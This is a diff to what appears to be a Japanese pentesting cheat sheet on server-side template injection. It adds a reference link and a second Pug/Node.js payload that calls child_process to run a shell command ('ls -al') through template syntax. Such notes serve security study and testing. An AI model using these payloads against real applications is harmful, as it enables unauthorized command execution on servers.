@@ -20,10 +20,14 @@
 
 ### Pug
 
+https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=PUG#pugjs-nodejs
+
 javascript コードを直接実行できる
 
 ```javascript
 #{root.process.mainModule.require('child_process').spawnSync('ls', ['-al']).stdout}
+
+#{global.process.mainModule.require('child_process').spawnSync('ls', ['-al']).stdout}
 ```
 
 ### Smarty
